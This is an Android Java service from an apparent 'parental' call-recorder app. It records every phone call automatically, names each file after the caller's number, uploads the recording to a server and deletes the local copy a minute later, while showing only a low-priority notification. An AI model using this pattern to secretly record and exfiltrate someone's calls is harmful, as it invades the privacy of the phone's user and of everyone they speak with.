package com.parental.callrecorder;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class CallRecordingService extends Service {
    
    private static final String TAG = "CallRecordingService";
    private static final int NOTIFICATION_ID = 101;
    private static final String CHANNEL_ID = "call_recording_channel";
    
    private TelephonyManager telephonyManager;
    private PhoneStateListener phoneStateListener;
    private MediaRecorder mediaRecorder;
    private File currentRecordingFile;
    private boolean isRecording = false;
    private String currentPhoneNumber = "Unknown";
    private long callStartTime = 0;
    private ScheduledExecutorService scheduler;
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service onCreate");
        
        // Δημιουργία notification channel
        createNotificationChannel();
        
        // Εμφάνιση foreground notification
        startForeground(NOTIFICATION_ID, createNotification());
        
        // Αρχικοποίηση telephony manager
        telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        
        // Δημιουργία scheduler για periodic tasks
        scheduler = Executors.newScheduledThreadPool(1);
        
        // Δημιουργία phone state listener
        setupPhoneStateListener();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service onStartCommand");
        
        if (intent != null && intent.hasExtra("action")) {
            String action = intent.getStringExtra("action");
            String callType = intent.getStringExtra("call_type");
            
            if ("start_recording".equals(action)) {
                Log.d(TAG, "Starting recording from Accessibility Service");
                startRecordingFromAccessibility(callType);
            } else if ("stop_recording".equals(action)) {
                Log.d(TAG, "Stopping recording from Accessibility Service");
                stopRecordingAndUpload(0);
            }
        } else {
            // Έναρξη παρακολούθησης κλήσεων μέσω PhoneStateListener
            startCallMonitoring();
        }
        
        return START_STICKY;
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                getString(R.string.notification_channel_name),
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription(getString(R.string.notification_channel_description));
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }
    
    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(getString(R.string.notification_title))
            .setContentText(getString(R.string.notification_text))
            .setSmallIcon(android.R.drawable.ic_menu_call)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build();
    }
    
    private void setupPhoneStateListener() {
        phoneStateListener = new PhoneStateListener() {
            @Override
            public void onCallStateChanged(int state, String phoneNumber) {
                super.onCallStateChanged(state, phoneNumber);
                
                switch (state) {
                    case TelephonyManager.CALL_STATE_RINGING:
                        Log.d(TAG, "Incoming call from: " + phoneNumber);
                        currentPhoneNumber = phoneNumber != null ? phoneNumber : "Unknown";
                        break;
                        
                    case TelephonyManager.CALL_STATE_OFFHOOK:
                        Log.d(TAG, "Call started (offhook) - Number: " + phoneNumber);
                        currentPhoneNumber = phoneNumber != null ? phoneNumber : "Unknown";
                        callStartTime = System.currentTimeMillis();
                        startRecordingFromPhoneState(currentPhoneNumber);
                        break;
                        
                    case TelephonyManager.CALL_STATE_IDLE:
                        Log.d(TAG, "Call ended (idle)");
                        int duration = (int) ((System.currentTimeMillis() - callStartTime) / 1000);
                        stopRecordingAndUpload(duration);
                        currentPhoneNumber = "Unknown";
                        callStartTime = 0;
                        break;
                }
            }
        };
    }
    
    private void startCallMonitoring() {
        try {
            telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE);
            Log.d(TAG, "Call monitoring started");
        } catch (SecurityException e) {
            Log.e(TAG, "Permission denied for call monitoring: " + e.getMessage());
        }
    }
    
    private void stopCallMonitoring() {
        telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE);
        Log.d(TAG, "Call monitoring stopped");
    }
    
    private void startRecordingFromPhoneState(String phoneNumber) {
        if (isRecording) {
            Log.w(TAG, "Already recording, skipping");
            return;
        }
        
        try {
            mediaRecorder = new MediaRecorder();
            
            try {
                mediaRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
                Log.d(TAG, "Using VOICE_CALL audio source");
            } catch (RuntimeException e) {
                try {
                    mediaRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
                    Log.d(TAG, "Using VOICE_COMMUNICATION audio source");
                } catch (RuntimeException e2) {
                    mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                    Log.d(TAG, "Using MIC audio source (limited quality)");
                }
            }
            
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mediaRecorder.setAudioEncodingBitRate(64000);
            mediaRecorder.setAudioSamplingRate(16000);
            
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
            String filename = "call_" + timestamp + "_" + phoneNumber + ".mp4";
            
            File recordingsDir = new File(Environment.getExternalStorageDirectory(), "CallRecordings");
            if (!recordingsDir.exists()) {
                recordingsDir.mkdirs();
            }
            
            currentRecordingFile = new File(recordingsDir, filename);
            
            mediaRecorder.setOutputFile(currentRecordingFile.getAbsolutePath());
            mediaRecorder.prepare();
            mediaRecorder.start();
            
            isRecording = true;
            Log.d(TAG, "Recording started: " + currentRecordingFile.getAbsolutePath());
            
            updateNotification("Recording call: " + phoneNumber);
            
        } catch (IOException | RuntimeException e) {
            Log.e(TAG, "Failed to start recording: " + e.getMessage());
            e.printStackTrace();
            releaseMediaRecorder();
        }
    }
    
    private void startRecordingFromAccessibility(String callType) {
        if (isRecording) {
            Log.w(TAG, "Already recording, skipping");
            return;
        }
        
        try {
            mediaRecorder = new MediaRecorder();
            
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            Log.d(TAG, "Using MIC audio source (Accessibility mode)");
            
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mediaRecorder.setAudioEncodingBitRate(64000);
            mediaRecorder.setAudioSamplingRate(16000);
            
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
            String filename = "call_access_" + timestamp + "_" + callType + ".mp4";
            
            File recordingsDir = new File(Environment.getExternalStorageDirectory(), "CallRecordings");
            if (!recordingsDir.exists()) {
                recordingsDir.mkdirs();
            }
            
            currentRecordingFile = new File(recordingsDir, filename);
            
            mediaRecorder.setOutputFile(currentRecordingFile.getAbsolutePath());
            mediaRecorder.prepare();
            mediaRecorder.start();
            
            isRecording = true;
            Log.d(TAG, "Recording started via Accessibility: " + currentRecordingFile.getAbsolutePath());
            
            updateNotification("Recording call via Accessibility");
            
        } catch (IOException | RuntimeException e) {
            Log.e(TAG, "Failed to start recording from Accessibility: " + e.getMessage());
            e.printStackTrace();
            releaseMediaRecorder();
        }
    }
    
    private void stopRecordingAndUpload(int duration) {
        if (!isRecording || mediaRecorder == null) {
            return;
        }
        
        try {
            mediaRecorder.stop();
            Log.d(TAG, "Recording stopped. Duration: " + duration + "s");
        } catch (RuntimeException e) {
            Log.e(TAG, "Error stopping recorder: " + e.getMessage());
        } finally {
            releaseMediaRecorder();
            isRecording = false;
            
            if (currentRecordingFile != null && currentRecordingFile.exists()) {
                uploadRecordingToServer(duration);
            }
            
            updateNotification(getString(R.string.notification_text));
        }
    }
    
    private void uploadRecordingToServer(int duration) {
        if (currentRecordingFile == null || !currentRecordingFile.exists()) {
            Log.w(TAG, "No recording file to upload");
            return;
        }
        
        Log.d(TAG, "Preparing to upload recording: " + currentRecordingFile.getName());
        
        String callType = "incoming";
        
        UploadUtils.uploadRecording(this, currentRecordingFile, currentPhoneNumber, callType, duration);
        
        scheduler.schedule(() -> {
            if (currentRecordingFile != null && currentRecordingFile.exists()) {
                boolean deleted = currentRecordingFile.delete();
                Log.d(TAG, "Cleanup: Local file deleted: " + deleted);
            }
        }, 1, TimeUnit.MINUTES);
    }
    
    private void updateNotification(String text) {
        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        if (manager != null) {
            Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle(getString(R.string.notification_title))
                .setContentText(text)
                .setSmallIcon(android.R.drawable.ic_menu_call)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build();
            
            manager.notify(NOTIFICATION_ID, notification);
        }
    }
    
    private void releaseMediaRecorder() {
        if (mediaRecorder != null) {
            try {
                mediaRecorder.release();
            } catch (Exception e) {
                Log.e(TAG, "Error releasing recorder: " + e.getMessage());
            }
            mediaRecorder = null;
        }
    }
    
    @Override
    public void onDestroy() {
        Log.d(TAG, "Service onDestroy");
        
        if (isRecording) {
            stopRecordingAndUpload(0);
        }
        
        stopCallMonitoring();
        
        if (scheduler != null && !scheduler.isShutdown()) {
            scheduler.shutdown();
            try {
                if (!scheduler.awaitTermination(5, TimeUnit.SECONDS)) {
                    scheduler.shutdownNow();
                }
            } catch (InterruptedException e) {
                scheduler.shutdownNow();
            }
        }
        
        super.onDestroy();
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
